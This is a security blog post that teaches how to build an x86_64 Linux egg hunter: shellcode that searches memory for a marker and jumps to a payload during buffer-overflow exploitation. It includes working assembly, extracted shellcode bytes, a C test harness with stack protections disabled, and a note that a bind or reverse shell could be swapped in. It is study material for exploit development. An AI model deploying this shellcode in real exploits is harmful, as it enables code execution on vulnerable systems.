<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="EggHunter x86_64" /><meta name="author" content="Noah Tongate" /><meta property="og:locale" content="en_US" /><meta name="description" content="What is an Egg Hunter?" /><meta property="og:description" content="What is an Egg Hunter?" /><link rel="canonical" href="https://ap3x.github.io/posts/egghunter-x86_64/" /><meta property="og:url" content="https://ap3x.github.io/posts/egghunter-x86_64/" /><meta property="og:site_name" content="Ap3x Security" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-07-06T12:46:49-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="EggHunter x86_64" /><meta name="google-site-verification" content="hc0WsMROlLqBrjOZFEzVWbNtkroIFS0ATmWAsvSWHP8" /> <script type="application/ld+json"> {"headline":"EggHunter x86_64","dateModified":"2020-07-06T12:46:49-04:00","datePublished":"2020-07-06T12:46:49-04:00","description":"What is an Egg Hunter?","url":"https://ap3x.github.io/posts/egghunter-x86_64/","mainEntityOfPage":{"@type":"WebPage","@id":"https://ap3x.github.io/posts/egghunter-x86_64/"},"@type":"BlogPosting","author":{"@type":"Person","name":"Noah Tongate"},"@context":"https://schema.org"}</script><title>EggHunter x86_64 | Ap3x Security</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=G-LSK4HZJM17"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-LSK4HZJM17'); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/profile/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Ap3x Security</a></div><div class="site-subtitle font-italic">Security Engineer, OSCP Certified, Wannabe Hacker, and Engineering Student</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Ap3x" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['noah.tongate','gmail.com'].join('@')" aria-label="email" class="order-4" > <i class="fas fa-envelope"></i> </a> <a href="https://www.linkedin.com/in/noahtongate" aria-label="linkedin" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>EggHunter x86_64</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>EggHunter x86_64</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Mon, Jul 6, 2020, 12:46 PM -0400" > Jul 6, 2020 <i class="unloaded">2020-07-06T12:46:49-04:00</i> </span> by <span class="author"> Noah Tongate </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1488 words">8 min</span></div></div><div class="post-content"><h2 id="what-is-an-egg-hunter">What is an Egg Hunter?</h2><p>Essentially an egg hunter is used assuming that you found a overflow vulnerability with a very small space that you, the attacker controls that is less that that of a bind/reverse shell. So in order to utilize the space we can develop some shellcode to use the access syscall to read a virtual memory address and find our “egg”. An “egg” is usually 4 to 8 bytes that is unique and is placed at the beginning of the payload and we load both the egg and payload into a random area of memory. The egg hunter will look for our unique egg bytes and execute the payload after it.</p><p>There is a great whitepaper by Skape that really helps break things down to understand how an egghunter truly works at is core. It can be found at the link below.</p><blockquote><p>http://hick.org/code/skape/papers/egghunt-shellcode.pdf</p></blockquote><h2 id="egg-hunter-breakdown">Egg Hunter Breakdown</h2><p>As stated in the article by Skape we will be using the <code class="language-plaintext highlighter-rouge">access</code> syscall in order to make our egg hunter work.</p><p>I managed to come together with some command-line-fu to get the system call value we are looking for, which in this case is the access syscall.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">printf </span>SYS_access | gcc <span class="nt">-include</span> sys/syscall.h <span class="nt">-E</span> - | <span class="nb">tail</span> <span class="nt">-1</span> 
</pre></table></code></div></div><p>In order how to understand how to use the access syscall we can look at the manpage</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>man access
</pre></table></code></div></div><p>The manpage clearly shows how to use access and what arguments we need to pass.</p><blockquote><p>int access(const char *pathname, int mode);</p></blockquote><p>So first we need to clear the registers that we will be using.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>  xor edi, edi              ; rdi     -&gt; 0x0 Starts the search at 0x0
  mul edi                   ; rax|rdx -&gt; 0x0 clears the rax register for access syscall
  xchg eax, esi             ; rsi     -&gt; 0x0 The mode
</pre></table></code></div></div><p>Next we want to check each page of memory so we need to find our linux page size. You can use the following command below to find the page size of your system.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>getconf PAGESIZE
</pre></table></code></div></div><p>In my instance the page size is 4096 bytes and in hex this is 0x1000. So we can increment the rdx register then shift the bits to get 4096</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>  inc edx
  shl edx, 12               ; rdx     -&gt; 0x1000
</pre></table></code></div></div><p>Now that we know the register states we can increment by the page size and check if we have access to the location.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>increment_page:
  lea rdi, [rdi + rdx]      ; inc pointer by 4096 

increment_address:
  push 21
  pop rax                   ; access syscall # loaded into rax
  syscall                   ; call access($rdi, $rsi) where rsi is 0x0 and rdi is a memory address

  cmp al, 0xf2              ; if al contains 0xf2, EFAULT was returned (bad addr)
  je increment_page         ; continue the hunt!
  
</pre></table></code></div></div><p>If we do have access to the path then we ensure that the egg doesnt find itself. Then we compare the first four bytes to compare it to our egg which in this case is “beef”. In this case we are using Big Endian. So we compare the first 4 bytes or qword then once that is done we can compare the next 4 bytes and if both of those match then se jump to the beginning of our payload right after our two eggs.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>  add dil, 0x18             ; This offsets the register so the egg doesnt find itself
compare:
  mov rax, 0x62656566       ; store the egg for comparison, actual egg is beef ----&gt; feeb
  scasd                     ; compare first dword
  jne compare
  scasd                     ; compare second dword
  jne compare
jump_to_shell:
  jmp rdi                   ; found it
</pre></table></code></div></div><p>We can compile the source code below by running the following command then get the shellcode:</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>nasm <span class="nt">-f</span> elf64 egg-hunter.nasm <span class="nt">-o</span> egg-hunter.o
<span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>objdump <span class="nt">-D</span> egg-hunter.o | <span class="nb">grep</span> <span class="s2">"^ "</span> | <span class="nb">cut</span> <span class="nt">-f2</span><span class="si">)</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'\x'</span><span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span> <span class="nb">echo</span>
</pre></table></code></div></div><h2 id="source-code">Source Code</h2><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
</pre><td class="rouge-code"><pre>global _start

section .text
_start:
; syscall argument order
; %rdi %rsi %rdx %r10 %r8 %r9
; int access(const char *pathname, int mode);
; Clear the registers for access syscall
  xor edi, edi              ; rdi     -&gt; 0x0 Starts the search at 0x0
  mul edi                   ; rax|rdx -&gt; 0x0 clears the rax register for access syscall
  xchg eax, esi             ; rsi     -&gt; 0x0 The mode

  inc edx
  ; To find the page size of your linux system use this command: getconf PAGESIZE = 4096
  ; Shifts the bits by 2^12 ---&gt; Example: 1 shifts to 0x1000 and in hex is 4096
  shl edx, 12               ; rdx     -&gt; 0x1000

  ; known register state before the hunt begins
  ; rsi -&gt; 0x0
  ; rdi -&gt; 0x0
  ; rdx -&gt; 0x1000 -&gt; 4096 -&gt; PAGE_SIZE

increment_page:
  lea rdi, [rdi + rdx]      ; inc pointer by 4096 

; int access(const char *pathname, int mode);
; rax -&gt; 21
; rdi -&gt; pointer to memory
; rsi -&gt; mode (0x0)

increment_address:
  push 21
  pop rax                   ; access syscall # loaded into rax
  syscall                   ; call access($rdi, $rsi) where rsi is 0x0 and rdi is a memory address

  cmp al, 0xf2              ; if al contains 0xf2, EFAULT was returned (bad addr)
  je increment_page         ; continue the hunt!
  add dil, 0x18             ; This offsets the register so the egg doesnt find itself
compare:
  mov rax, 0x62656566       ; store the egg for comparison, actual egg is beef ----&gt; feeb
  scasd                     ; compare first dword
  jne compare
  scasd                     ; compare second dword
  jne compare
jump_to_shell:
  jmp rdi                   ; found it
</pre></table></code></div></div><p>After the shellcode is extracted we can see that the egg hunter length is 40 bytes. In order to test this we can use gdb to speed up the process. So I created a shellcode skeleton that places the shellcode payload into a random area of memory. Then we can execute the egghunter shellcode to find out eggs and payload.</p><p>The payload in this case is a simple shellcode that prints “Hello World” to the screen.</p><h2 id="testing-the-egg-hunter">Testing the Egg Hunter</h2><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="c1">// gcc -g -fno-stack-protector -z execstack  shellcode.c -o shellcode</span>
<span class="cp">#define EGG "\x66\x65\x65\x62"  // 0x62 65 65 66 62 65 65 66
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">egg</span><span class="p">[]</span> <span class="o">=</span> <span class="n">EGG</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">egghunter</span><span class="p">[]</span> <span class="o">=</span> \
<span class="s">"</span><span class="se">\x31\xff\xf7\xe7\x96\xff\xc2\xc1\xe2\x0c\x48\x8d\x3c\x17\x6a\x15\x58\x0f\x05\x3c\xf2\x74\xf3\x40\x80\xc7\x18\xb8\x66\x65\x65\x62\xaf\x75\xf8\xaf\x75\xf5\xff\xe7</span><span class="s">"</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">code</span><span class="p">[]</span> <span class="o">=</span> \
<span class="n">EGG</span>
<span class="n">EGG</span>
<span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x48\x31\xc0\x48\x83\xc0\x01\x48\x89\xc7\x68\x72\x6c\x64\x0a\x48\xbb\x48\x65\x6c\x6c\x6f\x20\x57\x6f\x53\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x0c\x0f\x05\x48\x31\xc0\x48\x83\xc0\x3c\x48\x31\xff\x0f\x05</span><span class="s">"</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>

  <span class="kt">char</span> <span class="o">*</span><span class="n">heap</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="mi">1000000</span><span class="p">);</span>
  <span class="n">memset</span><span class="p">(</span><span class="n">heap</span><span class="p">,</span> <span class="sc">'\0'</span><span class="p">,</span> <span class="mi">512</span><span class="p">);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">heap</span><span class="p">,</span> <span class="n">egg</span><span class="p">);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mi">4</span><span class="p">,</span> <span class="n">egg</span><span class="p">);</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">heap</span><span class="o">+</span><span class="mi">8</span><span class="p">,</span> <span class="n">code</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode length: %zu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">code</span><span class="p">));</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Egghunter length: %zu</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">egghunter</span><span class="p">));</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"Shellcode location: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">heap</span><span class="p">);</span>
  <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">egghunter</span><span class="p">;</span>
  <span class="n">ret</span><span class="p">();</span>
<span class="p">}</span>
</pre></table></code></div></div><p>We can compile the skeleton program when the following command to ensure that we can execute our shellcode.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>gcc <span class="nt">-g</span> <span class="nt">-fno-stack-protector</span> <span class="nt">-z</span> execstack shellcode-skeleton.c  <span class="nt">-o</span> shellcode-skeleton
</pre></table></code></div></div><p>After you successfully compile the shellcode skeleton we can begin to use Radare2 to show that the egg and payload execute.</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>r2 <span class="nt">-Ad</span> shellcode-skeleton
</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-07-06-egghunter-x86_64/Screenshot1.png" style="width: 90%" /></p><p>Next we want to continue until we reach the execution of the egghunter. We can now see that out two eggs and payload start at <code class="language-plaintext highlighter-rouge">0x7fc964e96010</code>. So in order to verify that our egg is found by the egg hunter we are gonna go back just before page with our shellcode which is at <code class="language-plaintext highlighter-rouge">0x7fc964e95000</code> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-07-06-egghunter-x86_64/Screenshot2.png" style="width: 50%" /></p><p>We can view the current instruction we are at using <code class="language-plaintext highlighter-rouge">Vpp</code>. We also need to set a break point where our egg is stored into the rax register at this step <code class="language-plaintext highlighter-rouge">0x557c5649a09b</code></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-07-06-egghunter-x86_64/Screenshot3.png" style="width: 75%" /></p><p>Then hit <code class="language-plaintext highlighter-rouge">s</code> to step to the next instruction. We want to stop right before the access syscall is called to speed up the search process of our egg and payload.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-07-06-egghunter-x86_64/Screenshot4.png" style="width: 75%" /></p><p>To exit the visual mode we can use <code class="language-plaintext highlighter-rouge">q</code>. So now we can set a break point at <code class="language-plaintext highlighter-rouge">0x557c5649a09b</code> and change the rdi register value to <code class="language-plaintext highlighter-rouge">0x7fc964e95000</code> to emulate as if we’ve reach the memory page right before our egg in memory.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-07-06-egghunter-x86_64/Screenshot5.png" style="width: 50%" /></p><p>Now that we have set a break point and change the rdi register we can go back to visual mode <code class="language-plaintext highlighter-rouge">Vpp</code> and step through a few times until we reach out eggs in memory at the address <code class="language-plaintext highlighter-rouge">0x7fc964e96010</code> and once the eggs are verified we should jump to our payload.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-07-06-egghunter-x86_64/Screenshot6.png" style="width: 80%" /></p><p>I used a NOP slide to ensure my payload will be executed properly. Now if we quit <code class="language-plaintext highlighter-rouge">q</code> out of visual mode and use <code class="language-plaintext highlighter-rouge">dc</code> we can continue the program and we should see “Hello World” in this case print to the screen.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/img/post/2020-07-06-egghunter-x86_64/Screenshot7.png" style="width: 50%" /></p><p>So now that we know that our egghunter works we can use other payloads such as a bind shell or reverse shell in place of the simple “Hello World” shellcode.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/offensive-security/'>Offensive Security</a>, <a href='/categories/osce/'>OSCE</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/osce/" class="post-tag no-text-decoration" >osce</a> <a href="/tags/exploit/" class="post-tag no-text-decoration" >exploit</a> <a href="/tags/development/" class="post-tag no-text-decoration" >development</a> <a href="/tags/shellcode/" class="post-tag no-text-decoration" >shellcode</a> <a href="/tags/egghunter/" class="post-tag no-text-decoration" >egghunter</a> <a href="/tags/overflow/" class="post-tag no-text-decoration" >overflow</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=EggHunter x86_64 - Ap3x Security&url=https://ap3x.github.io/posts/egghunter-x86_64/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=EggHunter x86_64 - Ap3x Security&u=https://ap3x.github.io/posts/egghunter-x86_64/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=EggHunter x86_64 - Ap3x Security&url=https://ap3x.github.io/posts/egghunter-x86_64/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/exploit-education-protostar-stack-series/">Exploit Exercise Protostar Stack Series</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/exploit/">exploit</a> <a class="post-tag" href="/tags/osce/">osce</a> <a class="post-tag" href="/tags/development/">development</a> <a class="post-tag" href="/tags/homelab/">homelab</a> <a class="post-tag" href="/tags/how-to/">how to</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/networking/">networking</a> <a class="post-tag" href="/tags/overflow/">overflow</a> <a class="post-tag" href="/tags/pentesting/">pentesting</a> <a class="post-tag" href="/tags/proxmox/">proxmox</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/offensive-security-certified-expert-study-plan/"><div class="card-body"> <span class="timeago small" > May 11, 2020 <i class="unloaded">2020-05-11T12:52:52-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Offensive Security Certified Expert Study Plan</h3><div class="text-muted small"><p> While taking summer computer science and engineering classes I took part in an independent study which allows me to make my own course essentially and do research on the topics I choose. So I decid...</p></div></div></a></div><div class="card"> <a href="/posts/advance-web-attacks/"><div class="card-body"> <span class="timeago small" > May 16, 2020 <i class="unloaded">2020-05-16T16:47:17-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Advance Web Attacks</h3><div class="text-muted small"><p> Introduction This content is gathered from multiple different resources that I have added all to this post that helped me understand and learn more about exploit development. There are a lot of go...</p></div></div></a></div><div class="card"> <a href="/posts/backdooring-portable-executables-(pe)/"><div class="card-body"> <span class="timeago small" > May 22, 2020 <i class="unloaded">2020-05-22T15:11:37-04:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Backdooring Portable Executables (PE)</h3><div class="text-muted small"><p> 